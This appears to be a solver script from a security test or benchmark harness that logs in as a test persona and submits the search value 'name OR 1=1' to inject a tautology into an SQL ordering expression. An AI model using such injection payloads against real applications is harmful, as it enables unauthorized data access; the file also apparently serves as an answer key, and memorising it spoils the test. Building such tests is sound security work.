// Run a saved search whose term stays benign inside the quoted LIKE clause but carries a boolean
// tautology that alters the structure of the ordering expression built outside the quotes.
import type { SolverCtx } from '../../truth/matrix-helpers.ts'

export async function solve(ctx: SolverCtx): Promise<void> {
  await ctx.login('persona_a')

  const qField = ctx.plan.params.searchQuery ?? 'q'
  const body: Record<string, string> = {}
  body[qField] = 'name OR 1=1'

  await ctx.fetch(ctx.plan.routes.searchRun!.path, {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify(body),
  })
}
